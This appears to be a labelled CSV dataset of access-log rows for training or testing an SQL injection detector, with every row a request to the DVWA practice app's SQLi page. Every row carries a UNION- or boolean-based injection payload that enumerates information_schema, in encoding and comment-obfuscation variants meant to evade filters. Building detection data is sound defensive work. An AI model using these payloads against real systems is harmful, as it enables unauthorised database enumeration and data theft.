ip,timestamp,method,url,path,query,protocol,status,size,response_time,referer,user_agent,decoded_url,decoded_query,body,decoded_body,content_type,is_json_payload,json_depth,param_count_body,attack_type,existing_label,label,label_source,request_hash
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27 +uNion++SELECT+ column_name, +table_name From information_schema.columns++whEre++table_name=%27users%27+ %2F%2A",/vulnerabilities/sqli/,"id%3D1%27 +uNion++SELECT+ column_name, +table_name From information_schema.columns++whEre++table_name=%27users%27+ %2F%2A",HTTP/1.1,200,2171,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1'  uNion  SELECT  column_name,  table_name From information_schema.columns  whEre  table_name='users'  /*","id=1'  uNion  SELECT  column_name,  table_name From information_schema.columns  whEre  table_name='users'  /*",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,da16def4b596530c4d688a432ac57892
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1%27%2F**%2FUNION%2F%2A*%2FSELECT/%2A%2A%2Fcolumn_name,/**/table_name%2F%2A*/From%2F%2A*/information_schema.columns%2F%2A%2A/Where%2F%2A%2A%2Ftable_name=%27users%27%2F*%2A%2F--/%2A%2A/-",/vulnerabilities/sqli/,"id=1%27%2F**%2FUNION%2F%2A*%2FSELECT/%2A%2A%2Fcolumn_name,/**/table_name%2F%2A*/From%2F%2A*/information_schema.columns%2F%2A%2A/Where%2F%2A%2A%2Ftable_name=%27users%27%2F*%2A%2F--/%2A%2A/-",HTTP/1.1,200,1236,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1'/**/UNION/**/SELECT/**/column_name,/**/table_name/**/From/**/information_schema.columns/**/Where/**/table_name='users'/**/--/**/-","id=1'/**/UNION/**/SELECT/**/column_name,/**/table_name/**/From/**/information_schema.columns/**/Where/**/table_name='users'/**/--/**/-",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,56816cd5687dcc452655ea5f391ffa54
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'+unioN+Select+column_name,+table_name+from+information_schema.columns+wHeRE+table_name%3D%27users%27+--+-",/vulnerabilities/sqli/,"id%3D1'+unioN+Select+column_name,+table_name+from+information_schema.columns+wHeRE+table_name%3D%27users%27+--+-",HTTP/1.1,200,3608,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1' unioN Select column_name, table_name from information_schema.columns wHeRE table_name='users' -- -","id=1' unioN Select column_name, table_name from information_schema.columns wHeRE table_name='users' -- -",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,a0c18e95d6b0fa1b27ae7b4ae9a332c8
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1%27 AND (SELECT+COUNT(%2A) FROM+information_schema.columns+WHERE+table_name%3D'users')>0+%23,/vulnerabilities/sqli/,id=1%27 AND (SELECT+COUNT(%2A) FROM+information_schema.columns+WHERE+table_name%3D'users')>0+%23,HTTP/1.1,200,511,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>0 #,id=1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>0 #,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,e89ef4d1c49f01dbf2fa19b5a8300784
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2509UNiOn%2509SelECt%2509table_name%252C%2509table_schema%2509FROM%2509information_schema.tables%2509%2523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2509UNiOn%2509SelECt%2509table_name%252C%2509table_schema%2509FROM%2509information_schema.tables%2509%2523&Submit=Submit,HTTP/1.1,200,555,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D1%27%09UNiOn%09SelECt%09table_name%2C%09table_schema%09FROM%09information_schema.tables%09%23&Submit=Submit,id=id%3D1%27%09UNiOn%09SelECt%09table_name%2C%09table_schema%09FROM%09information_schema.tables%09%23&Submit=Submit,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,1bc7b97af29f0215b7fba8f0d69320a0
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1'+and+(SELECT+COUNT(*) From information_schema.columns+WHERE+table_name%3D%27users')%3E0 %23,/vulnerabilities/sqli/,id=1'+and+(SELECT+COUNT(*) From information_schema.columns+WHERE+table_name%3D%27users')%3E0 %23,HTTP/1.1,200,801,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1' and (SELECT COUNT(*) From information_schema.columns WHERE table_name='users')>0 #,id=1' and (SELECT COUNT(*) From information_schema.columns WHERE table_name='users')>0 #,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,2dfcbb5efb282b1d090271f7476833f8
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'%2F%2A%2A/UNION/%2A*%2FSELECT/*%2A%2Fcolumn_name,/%2A*%2Ftable_name/%2A%2A%2FFROM/*%2A%2Finformation_schema.columns/**%2FWHERE%2F%2A%2A/table_name='users'/%2A%2A/%23",/vulnerabilities/sqli/,"id%3D1'%2F%2A%2A/UNION/%2A*%2FSELECT/*%2A%2Fcolumn_name,/%2A*%2Ftable_name/%2A%2A%2FFROM/*%2A%2Finformation_schema.columns/**%2FWHERE%2F%2A%2A/table_name='users'/%2A%2A/%23",HTTP/1.1,200,567,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1'/**/UNION/**/SELECT/**/column_name,/**/table_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'/**/#","id=1'/**/UNION/**/SELECT/**/column_name,/**/table_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'/**/#",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,9a5b8b6866faa80ad8286c1ec748b6a9
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27%2F%2A%2A/UNION/%2A%2A%2FSELECT%2F%2A%2A%2Fcolumn_name,/%2A*%2Ftable_name/*%2A%2FFROM/%2A%2A%2Finformation_schema.columns/%2A%2A%2FWHERE/%2A%2A/table_name=%27users%27%2F%2A*%2F#",/vulnerabilities/sqli/,"id%3D1%27%2F%2A%2A/UNION/%2A%2A%2FSELECT%2F%2A%2A%2Fcolumn_name,/%2A*%2Ftable_name/*%2A%2FFROM/%2A%2A%2Finformation_schema.columns/%2A%2A%2FWHERE/%2A%2A/table_name=%27users%27%2F%2A*%2F",HTTP/1.1,200,3829,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1'/**/UNION/**/SELECT/**/column_name,/**/table_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'/**/#","id=1'/**/UNION/**/SELECT/**/column_name,/**/table_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'/**/",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,c28f2c0ac303b81ab99c7d68631887c3
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1'+union+select+column_name,+table_name+FROM+information_schema.columns+wherE+table_name='users'+--+-",/vulnerabilities/sqli/,"id=1'+union+select+column_name,+table_name+FROM+information_schema.columns+wherE+table_name='users'+--+-",HTTP/1.1,200,524,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1' union select column_name, table_name FROM information_schema.columns wherE table_name='users' -- -","id=1' union select column_name, table_name FROM information_schema.columns wherE table_name='users' -- -",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,210a295af0f35cab5adcd27b6b724aed
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2509and%2509%2528SELECT%2509COUNT%2528%252A%2529%2509FROM%2509information_schema.columns%2509where%2509table_name%253D%2527users%2527%2529%253E0%2509%2523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2509and%2509%2528SELECT%2509COUNT%2528%252A%2529%2509FROM%2509information_schema.columns%2509where%2509table_name%253D%2527users%2527%2529%253E0%2509%2523&Submit=Submit,HTTP/1.1,200,2617,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=id%3D1%27%09and%09%28SELECT%09COUNT%28%2A%29%09FROM%09information_schema.columns%09where%09table_name%3D%27users%27%29%3E0%09%23&Submit=Submit,id=id%3D1%27%09and%09%28SELECT%09COUNT%28%2A%29%09FROM%09information_schema.columns%09where%09table_name%3D%27users%27%29%3E0%09%23&Submit=Submit,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,0439f09c591a6ecd5cf887230934d1ce
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1' UNION SELECT table_name, table_schema FROM information_schema.tables -- -",/vulnerabilities/sqli/,"id%3D1' UNION SELECT table_name, table_schema FROM information_schema.tables -- -",HTTP/1.1,200,4301,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1' UNION SELECT table_name, table_schema FROM information_schema.tables -- -","id=1' UNION SELECT table_name, table_schema FROM information_schema.tables -- -",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,34d1bbb04c437fe0b589efe15cc0636e
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ftable_name%2C%2F%2A%2A%2Ftable_schema%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F%23,/vulnerabilities/sqli/,id%3D1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ftable_name%2C%2F%2A%2A%2Ftable_schema%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F%23,HTTP/1.1,200,670,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=1'/**/UNION/**/SELECT/**/table_name,/**/table_schema/**/FROM/**/information_schema.tables/**/#","id=1'/**/UNION/**/SELECT/**/table_name,/**/table_schema/**/FROM/**/information_schema.tables/**/#",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,88a633766d8eadfd542b5f9df289762f
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1%27 UNION+SELECT table_name,+table_schema+FROM+information_schema.tables+--",/vulnerabilities/sqli/,"id=1%27 UNION+SELECT table_name,+table_schema+FROM+information_schema.tables+--",HTTP/1.1,200,2277,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1' UNION SELECT table_name, table_schema FROM information_schema.tables --","id=1' UNION SELECT table_name, table_schema FROM information_schema.tables --",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,709c93cffe4619f20968ec2ed6dfdf94
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27 Union+SELECT+column_name,+table_name From information_schema.columns Where+table_name%3D%27users' --+-",/vulnerabilities/sqli/,"id%3D1%27 Union+SELECT+column_name,+table_name From information_schema.columns Where+table_name%3D%27users' --+-",HTTP/1.1,200,1029,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1' Union SELECT column_name, table_name From information_schema.columns Where table_name='users' -- -","id=1' Union SELECT column_name, table_name From information_schema.columns Where table_name='users' -- -",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,53950e9e416ae7f0ee0b525cace48f50
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252F%252A%252A%252FUNION%252F%252A%252A%252FSelect%252F%252A%252A%252Fcolumn_name%252C%252F%252A%252A%252Ftable_name%252F%252A%252A%252FFrom%252F%252A%252A%252Finformation_schema.columns%252F%252A%252A%252FWhere%252F%252A%252A%252Ftable_name%253D%2527users%2527%252F%252A%252A%252F%252523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252F%252A%252A%252FUNION%252F%252A%252A%252FSelect%252F%252A%252A%252Fcolumn_name%252C%252F%252A%252A%252Ftable_name%252F%252A%252A%252FFrom%252F%252A%252A%252Finformation_schema.columns%252F%252A%252A%252FWhere%252F%252A%252A%252Ftable_name%253D%2527users%2527%252F%252A%252A%252F%252523&Submit=Submit,HTTP/1.1,200,3125,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSelect%2F%2A%2A%2Fcolumn_name%2C%2F%2A%2A%2Ftable_name%2F%2A%2A%2FFrom%2F%2A%2A%2Finformation_schema.columns%2F%2A%2A%2FWhere%2F%2A%2A%2Ftable_name%3D%27users%27%2F%2A%2A%2F%2523&Submit=Submit,id=id%3D1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSelect%2F%2A%2A%2Fcolumn_name%2C%2F%2A%2A%2Ftable_name%2F%2A%2A%2FFrom%2F%2A%2A%2Finformation_schema.columns%2F%2A%2A%2FWhere%2F%2A%2A%2Ftable_name%3D%27users%27%2F%2A%2A%2F%2523&Submit=Submit,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,5f151458c87b15dae3e93e5903402f54
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252520UNION%252520SELECT%252520column_name%252C%252520table_name%252520FROM%252520information_schema.columns%252520WHERE%252520table_name%253D%2527users%2527%252520%253B--%252520-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252520UNION%252520SELECT%252520column_name%252C%252520table_name%252520FROM%252520information_schema.columns%252520WHERE%252520table_name%253D%2527users%2527%252520%253B--%252520-&Submit=Submit,HTTP/1.1,200,2256,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=id%3D1%27%2520UNION%2520SELECT%2520column_name%2C%2520table_name%2520FROM%2520information_schema.columns%2520WHERE%2520table_name%3D%27users%27%2520%3B--%2520-&Submit=Submit,id=id%3D1%27%2520UNION%2520SELECT%2520column_name%2C%2520table_name%2520FROM%2520information_schema.columns%2520WHERE%2520table_name%3D%27users%27%2520%3B--%2520-&Submit=Submit,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,a9c13885d4efc80eea9190297f1eba7f
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1%27%20And%20(SELECT%20COUNT(*)%20from%20information_schema.columns%20WHERE%20table_name%3D'users%27)%3E0%20--,/vulnerabilities/sqli/,id=1%27%20And%20(SELECT%20COUNT(*)%20from%20information_schema.columns%20WHERE%20table_name%3D'users%27)%3E0%20--,HTTP/1.1,200,3055,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1' And (SELECT COUNT(*) from information_schema.columns WHERE table_name='users')>0 --,id=1' And (SELECT COUNT(*) from information_schema.columns WHERE table_name='users')>0 --,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,2872b3ca76996592fa5c24b88b651207
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1'+AND+(SELECT+COUNT(*)+FROM+information_schema.columns+WHERE+table_name='users')>0+--,/vulnerabilities/sqli/,id=1'+AND+(SELECT+COUNT(*)+FROM+information_schema.columns+WHERE+table_name='users')>0+--,HTTP/1.1,200,544,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>0 --,id=1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>0 --,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,8478dac030fcd27af03fe4b08492799e
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252520UNION%252520select%252520table_name%252C%252520table_schema%252520from%252520information_schema.tables%252520%2523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252520UNION%252520select%252520table_name%252C%252520table_schema%252520from%252520information_schema.tables%252520%2523&Submit=Submit,HTTP/1.1,200,2926,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/vulnerabilities/sqli/?id=id%3D1%27%2520UNION%2520select%2520table_name%2C%2520table_schema%2520from%2520information_schema.tables%2520%23&Submit=Submit,id=id%3D1%27%2520UNION%2520select%2520table_name%2C%2520table_schema%2520from%2520information_schema.tables%2520%23&Submit=Submit,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,43b7c85c3af32be8b4821298727bada6
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1'/**/and/**/(SELECT/**/COUNT(*)/**/from/**/information_schema.columns/**/Where/**/table_name='users')>0/**/;--/**/-,/vulnerabilities/sqli/,id=1'/**/and/**/(SELECT/**/COUNT(*)/**/from/**/information_schema.columns/**/Where/**/table_name='users')>0/**/;--/**/-,HTTP/1.1,200,740,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1'/**/and/**/(SELECT/**/COUNT(*)/**/from/**/information_schema.columns/**/Where/**/table_name='users')>0/**/;--/**/-,id=1'/**/and/**/(SELECT/**/COUNT(*)/**/from/**/information_schema.columns/**/Where/**/table_name='users')>0/**/;--/**/-,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,f76144d226283d9c2eeb45bab5e73474
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27%20Union%20select%20table_name,%20table_schema%20fROM%20information_schema.tables%20--",/vulnerabilities/sqli/,"id%3D1%27%20Union%20select%20table_name,%20table_schema%20fROM%20information_schema.tables%20--",HTTP/1.1,200,618,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","/vulnerabilities/sqli/?id=1' Union select table_name, table_schema fROM information_schema.tables --","id=1' Union select table_name, table_schema fROM information_schema.tables --",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,20643e9aa628bf8857c4356c451610fc
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%09AND%09%28SELECT%09COUNT%28%2A%29%09FROM%09information_schema.columns%09WHERE%09table_name%3D%27users%27%29%3E0%09%2F%2A,/vulnerabilities/sqli/,id%3D1%27%09AND%09%28SELECT%09COUNT%28%2A%29%09FROM%09information_schema.columns%09WHERE%09table_name%3D%27users%27%29%3E0%09%2F%2A,HTTP/1.1,200,595,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/vulnerabilities/sqli/?id=1'	AND	(SELECT	COUNT(*)	FROM	information_schema.columns	WHERE	table_name='users')>0	/*,id=1'	AND	(SELECT	COUNT(*)	FROM	information_schema.columns	WHERE	table_name='users')>0	/*,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,09ebdc06e5c916319e265956703428a2
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27%20UNION%20SELECT%20table_name,%20table_schema%20FROM%20information_schema.tables%20%23",/vulnerabilities/sqli/,"id%3D1%27%20UNION%20SELECT%20table_name,%20table_schema%20FROM%20information_schema.tables%20%23",HTTP/1.1,200,1147,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15","/vulnerabilities/sqli/?id=1' UNION SELECT table_name, table_schema FROM information_schema.tables #","id=1' UNION SELECT table_name, table_schema FROM information_schema.tables #",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,4afef90046321b770970a96a23e24cf2
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252F%252A%252A%252FANd%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252FCOUNT%2528%252A%2529%252F%252A%252A%252Ffrom%252F%252A%252A%252Finformation_schema.columns%252F%252A%252A%252FWHERE%252F%252A%252A%252Ftable_name%253D%2527users%2527%2529%253E0%252F%252A%252A%252F%252F%252A&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252F%252A%252A%252FANd%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252FCOUNT%2528%252A%2529%252F%252A%252A%252Ffrom%252F%252A%252A%252Finformation_schema.columns%252F%252A%252A%252FWHERE%252F%252A%252A%252Ftable_name%253D%2527users%2527%2529%253E0%252F%252A%252A%252F%252F%252A&Submit=Submit,HTTP/1.1,200,4361,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/vulnerabilities/sqli/?id=id%3D1%27%2F%2A%2A%2FANd%2F%2A%2A%2F%28SELECT%2F%2A%2A%2FCOUNT%28%2A%29%2F%2A%2A%2Ffrom%2F%2A%2A%2Finformation_schema.columns%2F%2A%2A%2FWHERE%2F%2A%2A%2Ftable_name%3D%27users%27%29%3E0%2F%2A%2A%2F%2F%2A&Submit=Submit,id=id%3D1%27%2F%2A%2A%2FANd%2F%2A%2A%2F%28SELECT%2F%2A%2A%2FCOUNT%28%2A%29%2F%2A%2A%2Ffrom%2F%2A%2A%2Finformation_schema.columns%2F%2A%2A%2FWHERE%2F%2A%2A%2Ftable_name%3D%27users%27%29%3E0%2F%2A%2A%2F%2F%2A&Submit=Submit,,,,0,0,0,sqli_info_schema,1,1,existing_log_label,d973fbbb6990391844c70d6cf4a4b68f
192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1'/**/UNION/**/SELECT/**/column_name,/**/table_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'/**/#",/vulnerabilities/sqli/,"id=1'/**/UNION/**/SELECT/**/column_name,/**/table_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'/**/",HTTP/1.1,200,2828,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/vulnerabilities/sqli/?id=1'/**/UNION/**/SELECT/**/column_name,/**/table_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'/**/#","id=1'/**/UNION/**/SELECT/**/column_name,/**/table_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'/**/",,,,0,0,0,sqli_info_schema,1,1,existing_log_label,c28f2c0ac303b81ab99c7d68631887c3
